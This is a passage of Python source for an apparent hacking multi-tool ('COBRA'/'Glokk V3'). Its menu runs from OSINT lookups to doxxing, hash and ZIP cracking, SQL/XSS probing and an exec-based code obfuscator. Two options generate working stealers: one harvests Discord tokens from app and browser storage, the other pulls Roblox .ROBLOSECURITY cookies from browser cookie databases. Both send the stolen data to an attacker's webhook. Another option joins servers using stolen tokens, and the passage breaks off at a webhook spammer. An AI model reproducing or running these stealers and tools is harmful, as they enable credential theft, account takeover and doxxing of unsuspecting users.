    query = input(f"{RED}[?] Search term: {RESET}")
    encoded = urllib.parse.quote_plus(query)
    print(f"\n{CYAN}🔗 https://www.exploit-db.com/search?q={encoded}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_22():
    banner()
    print(f"{RED}{BOLD}[22] SQL Scanner (Authorized Only){RESET}\n")
    url = input(f"{RED}[?] Target URL: {RESET}")
    payloads = ["'", "\"", "' OR '1'='1"]
    for p in payloads:
        try:
            r = requests.get(f"{url}?id={p}", timeout=5)
            if "sql" in r.text.lower() or "mysql" in r.text.lower():
                print(f"{RED}⚠️ Possible SQL injection with: {p}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_23():
    banner()
    print(f"{RED}{BOLD}[23] XSS Scanner (Authorized Only){RESET}\n")
    url = input(f"{RED}[?] Target URL: {RESET}")
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    for p in payloads:
        try:
            r = requests.get(f"{url}?q={p}", timeout=5)
            if p in r.text:
                print(f"{RED}⚠️ Possible XSS with: {p}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_24():
    banner()
    print(f"{RED}{BOLD}[24] Website Cloner (Basic){RESET}\n")
    url = input(f"{RED}[?] URL to clone: {RESET}")
    if not url.startswith('http'):
        url = 'https://' + url
    out = input(f"{RED}[?] Output directory: {RESET}") or "cloned_site"
    os.makedirs(out, exist_ok=True)
    try:
        r = requests.get(url, timeout=10)
        with open(f"{out}/index.html", 'w', encoding='utf-8') as f:
            f.write(r.text)
        print(f"{GREEN}✅ Website cloned to {out}/index.html{RESET}")
    except:
        print(f"{RED}❌ Failed to clone website{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

# ========== OSINT (25-36) ==========
def tool_25():
    banner()
    print(f"{RED}{BOLD}[25] IP Geolocation{RESET}\n")
    ip = input(f"{RED}[?] IP Address: {RESET}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        d = r.json()
        print(f"{GREEN}📍 Country: {d['country']}{RESET}")
        print(f"{GREEN}📍 City: {d['city']}{RESET}")
        print(f"{GREEN}📍 ISP: {d['isp']}{RESET}")
    except:
        print(f"{RED}❌ Lookup failed{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_26():
    banner()
    print(f"{RED}{BOLD}[26] IP to ASN{RESET}\n")
    ip = input(f"{RED}[?] IP Address: {RESET}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        d = r.json()
        print(f"{GREEN}📡 ASN: {d.get('as', 'Unknown')}{RESET}")
        print(f"{GREEN}📡 ISP: {d.get('isp', 'Unknown')}{RESET}")
    except:
        print(f"{RED}❌ Error{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_27():
    banner()
    print(f"{RED}{BOLD}[27] Email Breach Checker{RESET}\n")
    email = input(f"{RED}[?] Email address: {RESET}")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", headers={'User-Agent': 'COBRA'}, timeout=10)
        if r.status_code == 200:
            breaches = r.json()
            print(f"{RED}❌ Found in {len(breaches)} data breaches!{RESET}")
            for b in breaches[:5]:
                print(f"    {RED}➤ {b['Name']} - {b['BreachDate']}{RESET}")
        elif r.status_code == 404:
            print(f"{GREEN}✅ No breaches found{RESET}")
        else:
            print(f"{YELLOW}⚠️ Rate limited{RESET}")
    except:
        print(f"{YELLOW}⚠️ Check failed{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_28():
    banner()
    print(f"{RED}{BOLD}[28] Username Tracker{RESET}\n")
    username = input(f"{RED}[?] Username: {RESET}")
    sites = {"GitHub": f"https://github.com/{username}", "Twitter": f"https://twitter.com/{username}", "Instagram": f"https://instagram.com/{username}"}
    for site, url in sites.items():
        try:
            if requests.get(url, timeout=3).status_code == 200:
                print(f"{GREEN}✅ {site}: {url}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_29():
    banner()
    print(f"{RED}{BOLD}[29] Phone Number Lookup{RESET}\n")
    phone = input(f"{RED}[?] Phone number (with country code): {RESET}")
    try:
        p = phonenumbers.parse(phone, None)
        print(f"{GREEN}📞 Country: {geocoder.description_for_number(p, 'en')}{RESET}")
        print(f"{GREEN}📞 Carrier: {carrier.name_for_number(p, 'en')}{RESET}")
        print(f"{GREEN}📞 Valid: {phonenumbers.is_valid_number(p)}{RESET}")
    except:
        print(f"{RED}❌ Invalid phone number{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_30():
    banner()
    print(f"{RED}{BOLD}[30] Domain Intel{RESET}\n")
    domain = input(f"{RED}[?] Domain: {RESET}")
    try:
        w = whois.whois(domain)
        print(f"{GREEN}📋 Registrar: {w.registrar}{RESET}")
        print(f"{GREEN}📋 Created: {w.creation_date}{RESET}")
        print(f"{GREEN}📋 Expires: {w.expiration_date}{RESET}")
    except:
        pass
    for rec in ['A', 'MX', 'NS']:
        try:
            ans = dns.resolver.resolve(domain, rec)
            print(f"{GREEN}{rec}: {ans[0]}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_31():
    banner()
    print(f"{RED}{BOLD}[31] Dox Tracker (Public OSINT){RESET}\n")
    target = input(f"{RED}[?] Target (username/email): {RESET}")
    for site in ["github", "twitter", "instagram", "reddit"]:
        try:
            if requests.get(f"https://{site}.com/{target}", timeout=3).status_code == 200:
                print(f"{GREEN}✅ {site.capitalize()}: https://{site}.com/{target}{RESET}")
        except:
            pass
    if '@' in target:
        try:
            r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{target}", headers={'User-Agent': 'COBRA'}, timeout=5)
            if r.status_code == 200:
                print(f"{RED}❌ Found in {len(r.json())} breaches{RESET}")
        except:
            pass
    print(f"\n{CYAN}🔗 IntelX: https://intelx.io/?s={target}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_32():
    banner()
    print(f"{RED}{BOLD}[32] File Metadata Scanner (EXIF){RESET}\n")
    path = input(f"{RED}[?] Image file path: {RESET}").strip().strip('"')
    try:
        img = Image.open(path)
        print(f"{GREEN}📷 Format: {img.format}{RESET}")
        print(f"{GREEN}📏 Size: {img.size[0]} x {img.size[1]}{RESET}")
        exif = img._getexif()
        if exif:
            from PIL.ExifTags import TAGS
            print(f"{GREEN}✅ EXIF Data Found:{RESET}")
            for tag, val in exif.items():
                print(f"  {TAGS.get(tag, tag)}: {val}")
        else:
            print(f"{YELLOW}⚠️ No EXIF data found{RESET}")
    except ImportError:
        print(f"{RED}❌ Install Pillow: pip install Pillow{RESET}")
    except:
        print(f"{RED}❌ Could not read image{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_33():
    banner()
    print(f"{RED}{BOLD}[33] Dorking Query Engine{RESET}\n")
    print(f"{RED}[1] Admin panels  [2] Open directories  [3] SQL files  [4] Config files  [5] Custom{RESET}")
    ch = input(f"{RED}[?] Select: {RESET}")
    dorks = {"1": "intitle:admin login", "2": "intitle:index.of", "3": "filetype:sql", "4": "filetype:env"}
    dork = dorks.get(ch, input(f"{RED}[?] Enter custom dork: {RESET}"))
    encoded = urllib.parse.quote_plus(dork)
    print(f"\n{CYAN}🔗 https://www.google.com/search?q={encoded}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_34():
    banner()
    print(f"{RED}{BOLD}[34] Dox Creator (OSINT Only){RESET}\n")
    target = input(f"{RED}[?] Target name/username: {RESET}")
    report = f"""
═══════════════════════════════════════════════════
DOX REPORT FOR: {target}
═══════════════════════════════════════════════════
Generated by Glokk V3 - OSINT Only

SOCIAL MEDIA:
- Twitter: https://twitter.com/{target}
- GitHub: https://github.com/{target}
- Instagram: https://instagram.com/{target}

═══════════════════════════════════════════════════
"""
    fname = f"{OUTPUT_DIR}dox_{target}_{int(time.time())}.txt"
    with open(fname, 'w') as f:
        f.write(report)
    print(f"{GREEN}✅ Dox report saved to {fname}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_35():
    banner()
    print(f"{RED}{BOLD}[35] Email Repair (Free API){RESET}\n")
    email = input(f"{RED}[?] Email to verify: {RESET}")
    try:
        r = requests.get(f"https://emailrep.io/{email}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            print(f"{GREEN}📧 Suspicious: {d['details'].get('suspicious', False)}{RESET}")
            print(f"{GREEN}📧 Deliverable: {d['details'].get('deliverable', False)}{RESET}")
            print(f"{GREEN}📧 Disposable: {d['details'].get('disposable', False)}{RESET}")
        else:
            print(f"{YELLOW}⚠️ API limit reached{RESET}")
    except:
        print(f"{RED}❌ API error{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_36():
    banner()
    print(f"{RED}{BOLD}[36] Temporary Mail Generator{RESET}\n")
    domains = ["temp-mail.org", "guerrillamail.com", "10minutemail.com"]
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@{random.choice(domains)}"
    print(f"{GREEN}📧 Generated: {email}{RESET}")
    with open(f"{OUTPUT_DIR}temp_email_{int(time.time())}.txt", 'w') as f:
        f.write(email)
    print(f"{GREEN}✅ Saved to {OUTPUT_DIR}temp_email_{int(time.time())}.txt{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

# ========== UTILITIES (37-47) ==========
def tool_37():
    banner()
    print(f"{RED}{BOLD}[37] Password Generator{RESET}\n")
    length = int(input(f"{RED}[?] Password length: {RESET}") or 12)
    special = input(f"{RED}[?] Include special chars? (y/n): {RESET}").lower() == 'y'
    chars = string.ascii_letters + string.digits + (string.punctuation if special else '')
    print(f"\n{GREEN}Generated Passwords:{RESET}")
    for i in range(5):
        print(f"{GREEN}{i+1}. {''.join(random.choices(chars, k=length))}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_38():
    banner()
    print(f"{RED}{BOLD}[38] Hash Identifier{RESET}\n")
    h = input(f"{RED}[?] Hash: {RESET}")
    l = len(h)
    patterns = {32: "MD5", 40: "SHA1", 64: "SHA256", 128: "SHA512", 56: "SHA224", 96: "SHA384"}
    if l in patterns:
        print(f"{GREEN}✅ Detected: {patterns[l]}{RESET}")
    elif h.startswith('$2'):
        print(f"{GREEN}✅ Detected: Bcrypt{RESET}")
    elif h.startswith('$5$'):
        print(f"{GREEN}✅ Detected: SHA256 Crypt{RESET}")
    elif h.startswith('$6$'):
        print(f"{GREEN}✅ Detected: SHA512 Crypt{RESET}")
    else:
        print(f"{YELLOW}⚠️ Unknown hash type ({l} chars){RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_39():
    banner()
    print(f"{RED}{BOLD}[39] Hash Cracker (Wordlist){RESET}\n")
    h = input(f"{RED}[?] Hash to crack: {RESET}")
    wl = input(f"{RED}[?] Wordlist path: {RESET}") or "rockyou.txt"
    if not os.path.exists(wl):
        print(f"{RED}❌ Wordlist not found: {wl}{RESET}")
        input()
        return
    print(f"\n{CYAN}[*] Cracking hash with {wl}...{RESET}")
    found = False
    with open(wl, 'r', encoding='utf-8', errors='ignore') as f:
        for word in f:
            word = word.strip()
            if hashlib.md5(word.encode()).hexdigest() == h:
                print(f"{GREEN}✅ Found: {word}{RESET}")
                found = True
                break
            elif hashlib.sha1(word.encode()).hexdigest() == h:
                print(f"{GREEN}✅ Found: {word}{RESET}")
                found = True
                break
            elif hashlib.sha256(word.encode()).hexdigest() == h:
                print(f"{GREEN}✅ Found: {word}{RESET}")
                found = True
                break
    if not found:
        print(f"{YELLOW}⚠️ Hash not found in wordlist{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_40():
    banner()
    print(f"{RED}{BOLD}[40] ZIP Cracker (Bruteforce){RESET}\n")
    path = input(f"{RED}[?] ZIP file path: {RESET}")
    maxlen = int(input(f"{RED}[?] Max password length: {RESET}") or 4)
    chars = string.ascii_lowercase + string.digits
    print(f"\n{CYAN}[*] Bruteforcing password (max length {maxlen})...{RESET}")
    for length in range(1, maxlen + 1):
        for combo in itertools.product(chars, repeat=length):
            pwd = ''.join(combo)
            try:
                with zipfile.ZipFile(path, 'r') as zf:
                    zf.extractall(pwd=pwd.encode())
                    print(f"{GREEN}✅ Password found: {pwd}{RESET}")
                    input()
                    return
            except:
                pass
    print(f"{YELLOW}⚠️ Password not found{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_41():
    banner()
    print(f"{RED}{BOLD}[41] File Hasher{RESET}\n")
    path = input(f"{RED}[?] File path: {RESET}").strip().strip('"')
    try:
        with open(path, 'rb') as f:
            data = f.read()
            print(f"{GREEN}MD5: {hashlib.md5(data).hexdigest()}{RESET}")
            print(f"{GREEN}SHA1: {hashlib.sha1(data).hexdigest()}{RESET}")
            print(f"{GREEN}SHA256: {hashlib.sha256(data).hexdigest()}{RESET}")
    except:
        print(f"{RED}❌ Could not read file{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_42():
    banner()
    print(f"{RED}{BOLD}[42] Text Encoder/Decoder{RESET}\n")
    text = input(f"{RED}[?] Text: {RESET}")
    print(f"{RED}[1] Encode Base64  [2] Decode Base64  [3] Encode Hex  [4] Decode Hex{RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    if choice == '1':
        print(f"{GREEN}Base64: {base64.b64encode(text.encode()).decode()}{RESET}")
    elif choice == '2':
        try:
            print(f"{GREEN}Decoded: {base64.b64decode(text).decode('utf-8')}{RESET}")
        except:
            print(f"{RED}❌ Invalid Base64{RESET}")
    elif choice == '3':
        print(f"{GREEN}Hex: {text.encode().hex()}{RESET}")
    elif choice == '4':
        try:
            print(f"{GREEN}Decoded: {bytes.fromhex(text).decode('utf-8')}{RESET}")
        except:
            print(f"{RED}❌ Invalid Hex{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_43():
    banner()
    print(f"{RED}{BOLD}[43] JWT Decoder{RESET}\n")
    jwt = input(f"{RED}[?] JWT Token: {RESET}")
    try:
        parts = jwt.split('.')
        if len(parts) == 3:
            header = base64.b64decode(parts[0] + '==').decode()
            payload = base64.b64decode(parts[1] + '==').decode()
            print(f"{GREEN}Header: {header}{RESET}")
            print(f"{GREEN}Payload: {payload}{RESET}")
        else:
            print(f"{RED}❌ Invalid JWT format{RESET}")
    except:
        print(f"{RED}❌ Could not decode JWT{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_44():
    banner()
    print(f"{RED}{BOLD}[44] QR Code Generator{RESET}\n")
    data = input(f"{RED}[?] Data to encode: {RESET}")
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        fname = f"{OUTPUT_DIR}qr_{int(time.time())}.png"
        img.save(fname)
        print(f"{GREEN}✅ QR Code saved to {fname}{RESET}")
    except ImportError:
        print(f"{RED}❌ Install qrcode: pip install qrcode[pil]{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

# ========== ADVANCED PYTHON OBFUSCATOR (45) ==========
def tool_45():
    banner()
    print(f"{RED}{BOLD}[45] Advanced Python Obfuscator{RESET}\n")
    path = input(f"{RED}[?] Python file to obfuscate: {RESET}")
    try:
        with open(path, 'r', encoding='utf-8') as f:
            code = f.read()
        
        print(f"{CYAN}[*] Obfuscation methods:{RESET}")
        print(f"{RED} 1. Base64 + Compression{RESET}")
        print(f"{RED} 2. Variable Name Randomization{RESET}")
        print(f"{RED} 3. String Encryption{RESET}")
        print(f"{RED} 4. Control Flow Obfuscation{RESET}")
        print(f"{RED} 5. All Methods (Maximum){RESET}")
        
        method = input(f"\n{RED}[?] Choose method (1-5): {RESET}")
        
        if method == "1":
            import zlib
            compressed = zlib.compress(code.encode())
            b64 = base64.b64encode(compressed).decode()
            obfuscated = f"import zlib,base64\nexec(zlib.decompress(base64.b64decode('{b64}')))"
        elif method == "2":
            import random
            var_map = {}
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.Name) and isinstance(node.ctx, ast.Store):
                    new_name = ''.join(random.choices(string.ascii_letters, k=8))
                    var_map[node.id] = new_name
            class VarRenamer(ast.NodeTransformer):
                def visit_Name(self, node):
                    if node.id in var_map:
                        node.id = var_map[node.id]
                    return node
            new_tree = VarRenamer().visit(tree)
            obfuscated = ast.unparse(new_tree)
        elif method == "3":
            strings = re.findall(r'["\'](.*?)["\']', code)
            enc_strings = []
            for s in strings:
                enc = base64.b64encode(s.encode()).decode()
                enc_strings.append((s, enc))
            obfuscated = code
            for s, enc in enc_strings:
                obfuscated = obfuscated.replace(f'"{s}"', f'base64.b64decode("{enc}").decode()')
            obfuscated = "import base64\n" + obfuscated
        elif method == "4":
            lines = code.split('\n')
            junk = ['pass', '# noop', 'if True: pass', '_ = lambda x: x']
            obfuscated_lines = []
            for line in lines:
                obfuscated_lines.append(line)
                if random.random() > 0.7:
                    obfuscated_lines.append(f"    {random.choice(junk)}  # junk")
            obfuscated = '\n'.join(obfuscated_lines)
        else:
            import zlib, random
            compressed = zlib.compress(code.encode())
            b64 = base64.b64encode(compressed).decode()
            obfuscated = f"import zlib,base64\nexec(zlib.decompress(base64.b64decode('{b64}')))"
        
        fname = f"{OUTPUT_DIR}obfuscated_{int(time.time())}.py"
        with open(fname, 'w', encoding='utf-8') as f:
            f.write(obfuscated)
        print(f"{GREEN}✅ Obfuscated code saved to {fname}{RESET}")
        print(f"{GREEN}✅ Original size: {len(code)} bytes | Obfuscated size: {len(obfuscated)} bytes{RESET}")
    except Exception as e:
        print(f"{RED}❌ Obfuscation failed: {e}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_46():
    banner()
    print(f"{RED}{BOLD}[46] Export Report{RESET}\n")
    if not RESULTS:
        print(f"{YELLOW}⚠️ No results to export{RESET}")
    else:
        fname = f"{OUTPUT_DIR}cobra_report_{int(time.time())}.json"
        with open(fname, 'w') as f:
            json.dump(RESULTS, f, indent=4)
        print(f"{GREEN}✅ Report saved to {fname}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_47():
    global THREADS, TIMEOUT
    banner()
    print(f"{RED}{BOLD}[47] Settings{RESET}\n")
    print(f"{CYAN}Current Settings:{RESET}")
    print(f"{CYAN}Threads: {THREADS}{RESET}")
    print(f"{CYAN}Timeout: {TIMEOUT}s{RESET}")
    print(f"\n{RED}[1] Set Thread Count{RESET}")
    print(f"{RED}[2] Set Timeout{RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    if choice == '1':
        THREADS = int(input(f"{RED}[?] Threads (1-500): {RESET}") or 50)
        print(f"{GREEN}✅ Threads set to {THREADS}{RESET}")
    elif choice == '2':
        TIMEOUT = int(input(f"{RED}[?] Timeout (seconds): {RESET}") or 5)
        print(f"{GREEN}✅ Timeout set to {TIMEOUT}s{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

# ========== DISCORD TOOLS (48-60) ==========
def tool_48():
    banner()
    print(f"{RED}{BOLD}[48] Discord List Checker{RESET}\n")
    filename = input(f"{RED}[?] Usernames file: {RESET}")
    try:
        with open(filename, 'r') as f:
            users = [l.strip().lower() for l in f if l.strip()]
        print(f"\n{GREEN}✅ Loaded {len(users)} usernames{RESET}\n")
        for i, u in enumerate(users, 1):
            print(f"{CYAN}[{i}/{len(users)}] Checking: {u}{RESET}", end="\r")
            if rate_limit_check("discord_api", 15, 60):
                try:
                    r = requests.post('https://discord.com/api/v9/auth/register', json={'username': u, 'consent': True}, timeout=5)
                    if r.status_code == 400 and 'username' in r.text.lower():
                        print(f"{GREEN}✅ {u} - AVAILABLE!{RESET}")
                    elif r.status_code == 429:
                        time.sleep(r.json().get('retry_after', 2))
                except:
                    pass
            time.sleep(0.5)
    except FileNotFoundError:
        print(f"{RED}❌ File not found{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_49():
    banner()
    print(f"{RED}{BOLD}[49] Discord Random Checker{RESET}\n")
    print(f"{RED}[1] 3 chars  [2] 4 chars  [3] 5 chars{RESET}")
    len_choice = input(f"{RED}[?] Choose length: {RESET}")
    length = {"1": 3, "2": 4, "3": 5}.get(len_choice, 4)
    print(f"{RED}[1] Regular (0.5s)  [2] Fast (0.2s)  [3] Hyper (0.05s){RESET}")
    speed_choice = input(f"{RED}[?] Choose speed: {RESET}")
    delay = {"1": 0.5, "2": 0.2, "3": 0.05}.get(speed_choice, 0.5)
    chars = string.ascii_lowercase + string.digits
    print(f"\n{CYAN}[🔍] Checking random {length}-char usernames (Ctrl+C to stop){RESET}\n")
    try:
        while True:
            un = ''.join(random.choices(chars, k=length))
            if rate_limit_check("discord_api", 15, 60):
                try:
                    r = requests.post('https://discord.com/api/v9/auth/register', json={'username': un, 'consent': True}, timeout=5)
                    if r.status_code == 400 and 'username' in r.text.lower():
                        print(f"{GREEN}[+] {un} - AVAILABLE!{RESET}")
                    elif r.status_code == 429:
                        time.sleep(r.json().get('retry_after', 2))
                except:
                    pass
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Stopped by user{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_50():
    banner()
    print(f"{RED}{BOLD}[50] Discord Wordlist Checker{RESET}\n")
    filename = input(f"{RED}[?] Wordlist file: {RESET}")
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            users = [l.strip().lower() for l in f if l.strip()]
        print(f"\n{GREEN}[+] Loaded {len(users)} usernames{RESET}\n")
        for u in users:
            if rate_limit_check("discord_api", 15, 60):
                try:
                    r = requests.post('https://discord.com/api/v9/auth/register', json={'username': u, 'consent': True}, timeout=5)
                    if r.status_code == 400 and 'username' in r.text.lower():
                        print(f"{GREEN}[+] {u} - AVAILABLE!{RESET}")
                except:
                    pass
            time.sleep(0.3)
    except FileNotFoundError:
        print(f"{RED}❌ File not found{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_51():
    banner()
    print(f"{RED}{BOLD}[51] Check Single Username{RESET}\n")
    un = input(f"{RED}[?] Username: {RESET}")
    if rate_limit_check("discord_api", 15, 60):
        try:
            r = requests.post('https://discord.com/api/v9/auth/register', json={'username': un, 'consent': True}, timeout=5)
            if r.status_code == 400:
                if 'username' in r.text.lower():
                    print(f"{GREEN}[+] {un} - AVAILABLE!{RESET}")
                else:
                    print(f"{RED}[-] {un} - Taken{RESET}")
            elif r.status_code == 429:
                print(f"{YELLOW}[!] Rate limited. Try again later.{RESET}")
            else:
                print(f"{RED}[-] {un} - Likely taken{RESET}")
        except:
            print(f"{YELLOW}[!] Error checking username{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_52():
    global WEBHOOK_URL
    banner()
    print(f"{RED}{BOLD}[52] Set Discord Webhook{RESET}\n")
    new = input(f"{RED}[?] Webhook URL: {RESET}")
    if new:
        WEBHOOK_URL = new
        print(f"{GREEN}[+] Webhook URL updated!{RESET}")
    else:
        print(f"{YELLOW}Current: {WEBHOOK_URL[:50] if WEBHOOK_URL else 'Not set'}{RESET}")
    time.sleep(1.5)

def tool_53():
    banner()
    print(f"{RED}{BOLD}[53] Test Webhook{RESET}\n")
    if WEBHOOK_URL:
        try:
            data = {"content": "[+] The Webhook is online!", "username": "COBRA"}
            r = requests.post(WEBHOOK_URL, json=data, timeout=5)
            if r.status_code in [200, 204]:
                print(f"{GREEN}[+] Webhook working!{RESET}")
            else:
                print(f"{RED}[-] Failed (Status: {r.status_code}){RESET}")
        except Exception as e:
            print(f"{RED}[-] Error: {e}{RESET}")
    else:
        print(f"{YELLOW}[!] No webhook configured. Use option 52 first.{RESET}")
    time.sleep(1.5)

def tool_54():
    banner()
    print(f"{RED}{BOLD}[54] Discord Token Grabber{RESET}\n")
    webhook = input(f"{RED}[?] Webhook URL to send tokens: {RESET}")
    if not webhook:
        print(f"{RED}[-] Webhook required{RESET}")
        input()
        return
    
    grabber_code = f'''
import os
import re
import json
import requests
import sqlite3
import base64
import shutil
from datetime import datetime

WEBHOOK = "{webhook}"

def get_tokens():
    tokens = []
    paths = [
        os.path.expandvars(r"%APPDATA%\\\\Discord\\\\Local Storage\\\\leveldb"),
        os.path.expandvars(r"%APPDATA%\\\\discordcanary\\\\Local Storage\\\\leveldb"),
        os.path.expandvars(r"%APPDATA%\\\\discordptb\\\\Local Storage\\\\leveldb"),
        os.path.expandvars(r"%APPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb"),
        os.path.expandvars(r"%APPDATA%\\\\BraveSoftware\\\\Brave-Browser\\\\Default\\\\Local Storage\\\\leveldb"),
    ]
    
    token_pattern = r'[\\\\w-]{{24,28}}\\\\.[\\\\w-]{{6,7}}\\\\.[\\\\w-]{{27,}}'
    
    for path in paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith(('.log', '.ldb')):
                        full_path = os.path.join(root, file)
                        try:
                            with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                                data = f.read()
                                found = re.findall(token_pattern, data)
                                tokens.extend(found)
                        except:
                            pass
    
    return list(set(tokens))

def send_to_webhook(tokens):
    if not tokens:
        return
    try:
        data = {{
            "content": f"**Discord Tokens Found:**\\\\n```\\\\n{{chr(10).join(tokens[:10])}}\\\\n```",
            "username": "TokenGrabber"
        }}
        requests.post(WEBHOOK, json=data, timeout=10)
    except:
        pass

if __name__ == "__main__":
    try:
        tokens = get_tokens()
        send_to_webhook(tokens)
    except:
        pass
'''
    
    fname = f"discord_token_grabber_{int(time.time())}.py"
    with open(fname, 'w', encoding='utf-8') as f:
        f.write(grabber_code)
    print(f"{GREEN}[+] Token grabber saved to {fname}{RESET}")
    print(f"{GREEN}[+] Will send grabbed tokens to: {webhook}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_55():
    banner()
    print(f"{RED}{BOLD}[55] Roblox Cookie Grabber{RESET}\n")
    webhook = input(f"{RED}[?] Webhook URL to send cookies: {RESET}")
    if not webhook:
        print(f"{RED}[-] Webhook required{RESET}")
        input()
        return
    
    grabber_code = f'''
import os
import re
import json
import requests
import sqlite3
import shutil
from datetime import datetime

WEBHOOK = "{webhook}"

def get_roblox_cookies():
    cookies = []
    paths = [
        os.path.expandvars(r"%APPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies"),
        os.path.expandvars(r"%APPDATA%\\\\BraveSoftware\\\\Brave-Browser\\\\Default\\\\Cookies"),
        os.path.expandvars(r"%APPDATA%\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Cookies"),
    ]
    
    for cookie_file in paths:
        if os.path.exists(cookie_file):
            temp_file = os.path.join(os.environ['TEMP'], 'cookies.db')
            try:
                shutil.copy2(cookie_file, temp_file)
                conn = sqlite3.connect(temp_file)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name = '.ROBLOSECURITY'")
                rows = cursor.fetchall()
                for name, value in rows:
                    if value:
                        cookies.append(value)
                conn.close()
                os.remove(temp_file)
            except:
                pass
    
    return list(set(cookies))

def send_to_webhook(cookies):
    if not cookies:
        return
    try:
        data = {{
            "content": f"**Roblox .ROBLOSECURITY Cookies Found:**\\\\n```\\\\n{{chr(10).join(cookies)}}\\\\n```",
            "username": "CookieGrabber"
        }}
        requests.post(WEBHOOK, json=data, timeout=10)
    except:
        pass

if __name__ == "__main__":
    try:
        cookies = get_roblox_cookies()
        send_to_webhook(cookies)
    except:
        pass
'''
    
    fname = f"roblox_cookie_grabber_{int(time.time())}.py"
    with open(fname, 'w', encoding='utf-8') as f:
        f.write(grabber_code)
    print(f"{GREEN}[+] Roblox cookie grabber saved to {fname}{RESET}")
    print(f"{GREEN}[+] Grabbed cookies will be sent to: {webhook}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_56():
    banner()
    print(f"{RED}{BOLD}[56] Discord Token Login{RESET}\n")
    token = input(f"{RED}[?] Discord Token: {RESET}")
    
    try:
        headers = {"Authorization": token}
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            user = r.json()
            print(f"{GREEN}[+] Token is valid!{RESET}")
            print(f"{GREEN}[+] User: {user['username']}#{user.get('discriminator', '0')}{RESET}")
            print(f"{GREEN}[+] ID: {user['id']}{RESET}")
            print(f"{GREEN}[+] Email: {user.get('email', 'Hidden')}{RESET}")
        else:
            print(f"{RED}[-] Invalid token (Status: {r.status_code}){RESET}")
    except:
        print(f"{RED}[-] Error checking token{RESET}")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_57():
    banner()
    print(f"{RED}{BOLD}[57] Discord Token Server Joiner{RESET}\n")
    token = input(f"{RED}[?] Discord Token: {RESET}")
    invite = input(f"{RED}[?] Invite Code: {RESET}")
    
    try:
        headers = {"Authorization": token}
        r = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, timeout=10)
        if r.status_code == 200:
            print(f"{GREEN}[+] Successfully joined server!{RESET}")
        elif r.status_code == 400:
            print(f"{RED}[-] Already in server or invalid invite{RESET}")
        elif r.status_code == 401:
            print(f"{RED}[-] Invalid token{RESET}")
        else:
            print(f"{RED}[-] Failed: Status {r.status_code}{RESET}")
    except:
        print(f"{RED}[-] Error joining server{RESET}")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_58():
    banner()
    print(f"{RED}{BOLD}[58] Discord Webhook Spammer{RESET}\n")
    webhook = input(f"{RED}[?] Webhook URL: {RESET}")
    amount = int(input(f"{RED}[?] Number of messages: {RESET}") or 100)
